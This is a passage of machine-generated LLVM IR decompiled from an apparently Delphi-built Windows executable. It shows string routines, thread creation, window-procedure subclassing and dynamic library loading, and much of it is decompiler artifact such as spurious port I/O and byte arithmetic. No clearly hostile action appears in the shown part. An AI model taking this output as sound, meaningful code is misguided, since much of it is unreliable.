dec_label_pc_406863:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1511
  ret i32 %0, !insn.addr !1511
}

define i32 @function_406868() local_unnamed_addr {
dec_label_pc_406868:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1512
}

define i32 @function_40686a(i32 %arg1) local_unnamed_addr {
dec_label_pc_40686a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1513
}

define i32 @function_40688f(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40688f:
  %esp.1.reg2mem = alloca i32, !insn.addr !1514
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1514
  %ecx.0.reg2mem = alloca i32, !insn.addr !1514
  %esp.0.reg2mem = alloca i32, !insn.addr !1514
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1514
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1514
  store i32 %5, i32* %6, align 4, !insn.addr !1514
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1515
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1515
  %11 = add i8 %8, %10, !insn.addr !1515
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1515
  store i8 %11, i8* %12, align 1, !insn.addr !1515
  %13 = add i32 %2, 58, !insn.addr !1516
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1516
  %15 = load i8, i8* %14, align 1, !insn.addr !1516
  %16 = load i32, i32* %eax, align 4, !insn.addr !1516
  %17 = udiv i32 %16, 256, !insn.addr !1516
  %18 = trunc i32 %17 to i8, !insn.addr !1516
  %19 = add i8 %15, %18, !insn.addr !1516
  store i8 %19, i8* %14, align 1, !insn.addr !1516
  %20 = add i32 %0, 112, !insn.addr !1517
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1517
  %22 = load i8, i8* %21, align 1, !insn.addr !1517
  %23 = trunc i32 %4 to i8, !insn.addr !1517
  %24 = add i8 %22, %23, !insn.addr !1517
  store i8 %24, i8* %21, align 1, !insn.addr !1517
  %25 = trunc i32 %3 to i16, !insn.addr !1518
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1518
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1518
  %27 = load i8, i8* %7, align 4, !insn.addr !1519
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1519
  %30 = add i8 %27, %29, !insn.addr !1519
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1519
  store i8 %30, i8* %31, align 1, !insn.addr !1519
  %32 = load i8, i8* %7, align 4, !insn.addr !1520
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1520
  %35 = add i8 %32, %34, !insn.addr !1520
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1520
  store i8 %35, i8* %36, align 1, !insn.addr !1520
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1521
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1522
  store i32 13, i32* %ecx.0.reg2mem, !insn.addr !1522
  br label %dec_label_pc_4068a8, !insn.addr !1522

dec_label_pc_4068a8:                              ; preds = %dec_label_pc_4068a8, %dec_label_pc_40688f
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1523
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1523
  store i32 0, i32* %39, align 4, !insn.addr !1523
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1524
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1524
  store i32 0, i32* %41, align 4, !insn.addr !1524
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1525
  %43 = icmp eq i32 %42, 0, !insn.addr !1525
  %44 = icmp eq i1 %43, false, !insn.addr !1526
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1526
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1526
  br i1 %44, label %dec_label_pc_4068a8, label %dec_label_pc_4068af, !insn.addr !1526

dec_label_pc_4068af:                              ; preds = %dec_label_pc_4068a8
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1527
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1527
  store i32 0, i32* %46, align 4, !insn.addr !1527
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1528
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1528
  store i32 %37, i32* %48, align 4, !insn.addr !1528
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1529
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1529
  store i32 4221764, i32* %50, align 4, !insn.addr !1529
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1530
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1530
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1530
  store i32 %51, i32* %53, align 4, !insn.addr !1530
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1531
  %54 = call i32 @"@LStrPos"(), !insn.addr !1532
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1533
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1533
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1533
  store i32 %57, i32* %56, align 4, !insn.addr !1533
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1534
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1535
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1535
  store i32 %61, i32* %60, align 4, !insn.addr !1535
  %62 = call i32 @function_4034f4(), !insn.addr !1536
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1537
  %64 = add i32 %arg1, -1, !insn.addr !1538
  store i32 %64, i32* %eax, align 4, !insn.addr !1538
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_406b29 [
    i32 0, label %dec_label_pc_406921
    i32 1, label %dec_label_pc_406a61
    i32 2, label %dec_label_pc_406acf
  ]

dec_label_pc_406921:                              ; preds = %dec_label_pc_4068af
  %65 = call i32 @function_4034f4(), !insn.addr !1539
  %66 = icmp slt i32 %65, 5, !insn.addr !1540
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1540
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1540
  br i1 %66, label %dec_label_pc_406b29, label %dec_label_pc_406932, !insn.addr !1540

dec_label_pc_406932:                              ; preds = %dec_label_pc_406921
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1541
  %68 = call i32 @function_406648(), !insn.addr !1542
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1543
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1543
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1544
  %72 = call i32 @function_406648(), !insn.addr !1545
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1546
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1546
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1547
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1547
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1547
  store i32 %75, i32* %77, align 4, !insn.addr !1547
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1548
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1548
  store i32 ptrtoint (i32* @global_var_406b68 to i32), i32* %79, align 4, !insn.addr !1548
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1549
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1549
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1549
  store i32 %80, i32* %82, align 4, !insn.addr !1549
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1550
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1551
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1551
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1552
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1552
  store i32 4221812, i32* %87, align 4, !insn.addr !1552
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1553
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1553
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1553
  store i32 %88, i32* %90, align 4, !insn.addr !1553
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1554
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1554
  store i32 4221828, i32* %92, align 4, !insn.addr !1554
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1555
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1555
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1555
  store i32 %93, i32* %95, align 4, !insn.addr !1555
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1556
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1556
  store i32 4221844, i32* %97, align 4, !insn.addr !1556
  %98 = call i32 @function_4079ec(), !insn.addr !1557
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1558
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1558
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1559
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1560
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1560
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1561
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1561
  store i32 %106, i32* %105, align 4, !insn.addr !1561
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1562
  %108 = call i32 @function_406648(), !insn.addr !1563
  %109 = call i32 @"@LStrPos"(), !insn.addr !1564
  %110 = add i32 %109, -1, !insn.addr !1565
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1566
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1566
  store i32 %110, i32* %112, align 4, !insn.addr !1566
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1567
  %114 = call i32 @function_406648(), !insn.addr !1568
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1569
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1570
  store i32 %116, i32* %112, align 4, !insn.addr !1571
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1572
  %118 = call i32 @function_406648(), !insn.addr !1573
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1574
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1574
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1575
  %122 = call i32 @function_406648(), !insn.addr !1576
  %123 = call i32 @function_405d28(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1577
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1578
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1578
  br label %dec_label_pc_406b29, !insn.addr !1578

dec_label_pc_406a61:                              ; preds = %dec_label_pc_4068af
  %124 = call i32 @function_4034f4(), !insn.addr !1579
  %125 = icmp slt i32 %124, 5, !insn.addr !1580
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1580
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1580
  br i1 %125, label %dec_label_pc_406b29, label %dec_label_pc_406a72, !insn.addr !1580

dec_label_pc_406a72:                              ; preds = %dec_label_pc_406a61
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1581
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1581
  store i32 ptrtoint ([5 x i8]* @global_var_406bb4 to i32), i32* %127, align 4, !insn.addr !1581
  %128 = call i32 @function_405078(), !insn.addr !1582
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1583
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1583
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1584
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1584
  store i32 ptrtoint ([7 x i8]* @global_var_406bc4 to i32), i32* %132, align 4, !insn.addr !1584
  %133 = call i32 @function_405078(), !insn.addr !1585
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1586
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1587
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1588
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1588
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1589
  %140 = call i32 @function_406648(), !insn.addr !1590
  %141 = call i32 @function_4051d0(), !insn.addr !1591
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1592
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1592
  br label %dec_label_pc_406b29, !insn.addr !1592

dec_label_pc_406acf:                              ; preds = %dec_label_pc_4068af
  %142 = call i32 @function_4034f4(), !insn.addr !1593
  %143 = icmp slt i32 %142, 5, !insn.addr !1594
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1594
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1594
  br i1 %143, label %dec_label_pc_406b29, label %dec_label_pc_406adc, !insn.addr !1594

dec_label_pc_406adc:                              ; preds = %dec_label_pc_406acf
  %144 = add i32 %esp.0.reload, -40, !insn.addr !1595
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1595
  store i32 ptrtoint ([5 x i8]* @global_var_406bb4 to i32), i32* %145, align 4, !insn.addr !1595
  %146 = call i32 @function_405078(), !insn.addr !1596
  %147 = add i32 %esp.0.reload, -44, !insn.addr !1597
  %148 = inttoptr i32 %147 to i32*, !insn.addr !1597
  %149 = add i32 %esp.0.reload, -48, !insn.addr !1598
  %150 = inttoptr i32 %149 to i32*, !insn.addr !1598
  store i32 ptrtoint ([7 x i8]* @global_var_406bc4 to i32), i32* %150, align 4, !insn.addr !1598
  %151 = call i32 @function_405078(), !insn.addr !1599
  %152 = add i32 %esp.0.reload, -52, !insn.addr !1600
  %153 = inttoptr i32 %152 to i32*
  %154 = call i32 @"@LStrCatN"(), !insn.addr !1601
  %155 = add i32 %esp.0.reload, -56, !insn.addr !1602
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1602
  %157 = call i32 @function_406648(), !insn.addr !1603
  %158 = call i32 @function_4051d0(), !insn.addr !1604
  store i32* %153, i32** %.pre-phi.reg2mem, !insn.addr !1604
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !1604
  br label %dec_label_pc_406b29, !insn.addr !1604

dec_label_pc_406b29:                              ; preds = %dec_label_pc_4068af, %dec_label_pc_406adc, %dec_label_pc_406acf, %dec_label_pc_406a72, %dec_label_pc_406a61, %dec_label_pc_406932, %dec_label_pc_406921
  %159 = add i32 %esp.0.reload, -16, !insn.addr !1605
  %160 = inttoptr i32 %159 to i32*, !insn.addr !1605
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %161 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1606
  call void @__writefsdword(i32 0, i32 %161), !insn.addr !1607
  %162 = add i32 %esp.1.reload, 8, !insn.addr !1608
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1608
  store i32 4221771, i32* %163, align 4, !insn.addr !1608
  %164 = call i32 @"@LStrArrayClr"(), !insn.addr !1609
  ret i32 %164, !insn.addr !1610
}

define i32 @function_406b44() local_unnamed_addr {
dec_label_pc_406b44:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1611
  ret i32 %0, !insn.addr !1611
}

define i32 @function_406b49() local_unnamed_addr {
dec_label_pc_406b49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1612
}

define i32 @function_406b4b(i32 %arg1) local_unnamed_addr {
dec_label_pc_406b4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1613
}

define i32 @function_406b77() local_unnamed_addr {
dec_label_pc_406b77:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1614
}

define i32 @function_406b7f() local_unnamed_addr {
dec_label_pc_406b7f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1615
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1615
  store i32 %1, i32* %2, align 4, !insn.addr !1615
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1616
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1616
  %7 = add i8 %4, %6, !insn.addr !1616
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1616
  store i8 %7, i8* %8, align 1, !insn.addr !1616
  %9 = load i8, i8* %3, align 4, !insn.addr !1617
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1617
  %12 = trunc i32 %11 to i8, !insn.addr !1617
  %13 = add i8 %9, %12, !insn.addr !1617
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1617
  store i8 %13, i8* %14, align 1, !insn.addr !1617
  %15 = load i32, i32* %eax, align 4, !insn.addr !1618
  ret i32 %15, !insn.addr !1618
}

define i32 @function_406b86() local_unnamed_addr {
dec_label_pc_406b86:
  %0 = call i32 @function_406bc4(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1619
  ret i32 %0, !insn.addr !1619
}

define i32 @function_406bc2() local_unnamed_addr {
dec_label_pc_406bc2:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1620
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1620
  store i8 %2, i8* %3, align 1, !insn.addr !1620
  ret i32 %0, !insn.addr !1620
}

define i32 @function_406bc4(i32 %arg1) local_unnamed_addr {
dec_label_pc_406bc4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_406c28, label %dec_label_pc_406bc7, !insn.addr !1621

dec_label_pc_406bc7:                              ; preds = %dec_label_pc_406bc4
  %5 = icmp eq i1 %4, false, !insn.addr !1622
  br i1 %5, label %dec_label_pc_406c3c, label %dec_label_pc_406bc9, !insn.addr !1622

dec_label_pc_406bc9:                              ; preds = %dec_label_pc_406bc7
  ret i32 %2, !insn.addr !1623

dec_label_pc_406c28:                              ; preds = %dec_label_pc_406bc4
  %6 = call i32 @function_4045d8(), !insn.addr !1624
  br label %dec_label_pc_406c3c, !insn.addr !1625

dec_label_pc_406c3c:                              ; preds = %dec_label_pc_406c28, %dec_label_pc_406bc7
  %7 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1626
  %8 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 0, i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1627
  %9 = add i32 %0, 20, !insn.addr !1628
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1628
  %11 = load i32, i32* %10, align 4, !insn.addr !1628
  %12 = add i32 %0, 16, !insn.addr !1629
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1629
  %14 = load i32, i32* %13, align 4, !insn.addr !1629
  %15 = add i32 %0, 8, !insn.addr !1630
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1630
  %17 = load i32, i32* %16, align 4, !insn.addr !1630
  %18 = inttoptr i32 %11 to i32*, !insn.addr !1631
  %19 = call i32 @DefWindowProcA(i32* %18, i32 %14, i32 %1, i32 %17), !insn.addr !1631
  ret i32 %19, !insn.addr !1632
}

define i32 @function_406c74() local_unnamed_addr {
dec_label_pc_406c74:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1633
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1633
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4221944 to i32*), i32 -4, i32 %3), !insn.addr !1634
  ret i32 %4, !insn.addr !1635
}

define i32 @function_406ca9(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406ca9:
  %merge.reg2mem = alloca i32, !insn.addr !1636
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1636
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1636
  store i8 %3, i8* %4, align 1, !insn.addr !1636
  %5 = add i32 %1, 114, !insn.addr !1637
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1637
  %7 = load i8, i8* %6, align 1, !insn.addr !1637
  %8 = udiv i32 %0, 256, !insn.addr !1637
  %9 = trunc i32 %8 to i8, !insn.addr !1637
  %10 = add i8 %7, %9, !insn.addr !1637
  store i8 %10, i8* %6, align 1, !insn.addr !1637
  %11 = add i8 %2, -32, !insn.addr !1638
  %12 = icmp ult i8 %2, 32, !insn.addr !1638
  %13 = icmp eq i8 %11, 0, !insn.addr !1638
  %14 = zext i8 %11 to i32, !insn.addr !1638
  %15 = and i32 %1, -256, !insn.addr !1638
  %16 = or i32 %15, %14, !insn.addr !1638
  %17 = or i1 %12, %13, !insn.addr !1639
  store i32 %16, i32* %merge.reg2mem, !insn.addr !1639
  br i1 %17, label %dec_label_pc_406cb2, label %dec_label_pc_406d21, !insn.addr !1639

dec_label_pc_406cb2:                              ; preds = %dec_label_pc_406ca9
  %18 = add i32 %16, 105, !insn.addr !1640
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1640
  %20 = load i8, i8* %19, align 1, !insn.addr !1640
  %21 = and i8 %20, %9, !insn.addr !1640
  store i8 %21, i8* %19, align 1, !insn.addr !1640
  %22 = trunc i32 %arg3 to i16, !insn.addr !1641
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1641
  %24 = load i8, i8* %23, align 1, !insn.addr !1641
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1641
  %25 = add i32 %arg5, 105, !insn.addr !1642
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1642
  %28 = load i8, i8* %27, align 1, !insn.addr !1642
  %29 = udiv i32 %arg2, 256, !insn.addr !1642
  %30 = trunc i32 %29 to i8, !insn.addr !1642
  %31 = and i8 %28, %30, !insn.addr !1642
  store i8 %31, i8* %27, align 1, !insn.addr !1642
  %32 = mul i32 %arg5, 2, !insn.addr !1643
  %33 = add i32 %arg2, 115, !insn.addr !1643
  %34 = add i32 %33, %32, !insn.addr !1643
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1643
  %36 = load i8, i8* %35, align 1, !insn.addr !1643
  %37 = trunc i32 %arg2 to i8, !insn.addr !1643
  %38 = add i8 %36, %37, !insn.addr !1643
  %39 = icmp eq i8 %38, 0, !insn.addr !1643
  store i8 %38, i8* %35, align 1, !insn.addr !1643
  br i1 %39, label %dec_label_pc_406d03, label %dec_label_pc_406cc1, !insn.addr !1644

dec_label_pc_406cc1:                              ; preds = %dec_label_pc_406cb2
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1645
  %41 = load i32, i32* %40, align 4, !insn.addr !1645
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1645
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1646
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1646
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1646
  %45 = icmp eq i32* %43, null, !insn.addr !1647
  %46 = icmp eq i1 %45, false, !insn.addr !1648
  store i32 %44, i32* %merge.reg2mem, !insn.addr !1648
  br i1 %46, label %dec_label_pc_406d21, label %dec_label_pc_406ce5, !insn.addr !1648

dec_label_pc_406ce5:                              ; preds = %dec_label_pc_406cc1
  %47 = call i32 @function_406c74(), !insn.addr !1649
  %48 = call i32 @function_4036f4(), !insn.addr !1650
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1651
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1652
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1652
  ret i32 %51, !insn.addr !1653

dec_label_pc_406d03:                              ; preds = %dec_label_pc_406cb2
  %52 = call i32 @__asm_insd(i16 %22), !insn.addr !1654
  %53 = inttoptr i32 %arg7 to i32*, !insn.addr !1654
  store i32 %52, i32* %53, align 4, !insn.addr !1654
  %54 = call i32 @__asm_in.50(i16 %22), !insn.addr !1655
  %55 = and i32 %54, 255, !insn.addr !1656
  %56 = add i32 %55, %arg4, !insn.addr !1656
  %57 = inttoptr i32 %56 to i8*, !insn.addr !1656
  %58 = load i8, i8* %57, align 1, !insn.addr !1656
  %59 = zext i8 %58 to i32, !insn.addr !1656
  %60 = and i32 %54, -256, !insn.addr !1656
  %61 = or i32 %60, %59, !insn.addr !1656
  ret i32 %61, !insn.addr !1656

dec_label_pc_406d21:                              ; preds = %dec_label_pc_406cc1, %dec_label_pc_406ca9
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !1656
}

define i32 @function_406dc9(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406dc9:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1657
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1657
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1657
  %9 = add i8 %6, %8, !insn.addr !1657
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1657
  store i8 %9, i8* %10, align 1, !insn.addr !1657
  %11 = load i32, i32* %eax, align 4, !insn.addr !1658
  %12 = add i32 %11, 114, !insn.addr !1658
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1658
  %14 = load i8, i8* %13, align 1, !insn.addr !1658
  %15 = udiv i32 %2, 256, !insn.addr !1658
  %16 = trunc i32 %15 to i8, !insn.addr !1658
  %17 = add i8 %14, %16, !insn.addr !1658
  store i8 %17, i8* %13, align 1, !insn.addr !1658
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1659
  %20 = add i8 %19, -32, !insn.addr !1659
  %21 = icmp ult i8 %19, 32, !insn.addr !1659
  %22 = icmp eq i8 %20, 0, !insn.addr !1659
  %23 = zext i8 %20 to i32, !insn.addr !1659
  %24 = and i32 %18, -256, !insn.addr !1659
  %25 = or i32 %24, %23, !insn.addr !1659
  store i32 %25, i32* %eax, align 4, !insn.addr !1659
  %26 = or i1 %21, %22, !insn.addr !1660
  br i1 %26, label %dec_label_pc_406dd2, label %dec_label_pc_406e41, !insn.addr !1660

dec_label_pc_406dd2:                              ; preds = %dec_label_pc_406dc9
  %27 = add i32 %25, 105, !insn.addr !1661
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1661
  %29 = load i8, i8* %28, align 1, !insn.addr !1661
  %30 = and i8 %29, %16, !insn.addr !1661
  store i8 %30, i8* %28, align 1, !insn.addr !1661
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1662
  store i32 %31, i32* %eax, align 4, !insn.addr !1662
  %32 = trunc i32 %arg3 to i16, !insn.addr !1663
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1663
  %34 = load i8, i8* %33, align 1, !insn.addr !1663
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1663
  %35 = add i32 %arg5, 105, !insn.addr !1664
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1664
  %38 = load i8, i8* %37, align 1, !insn.addr !1664
  %39 = udiv i32 %arg2, 256, !insn.addr !1664
  %40 = trunc i32 %39 to i8, !insn.addr !1664
  %41 = and i8 %38, %40, !insn.addr !1664
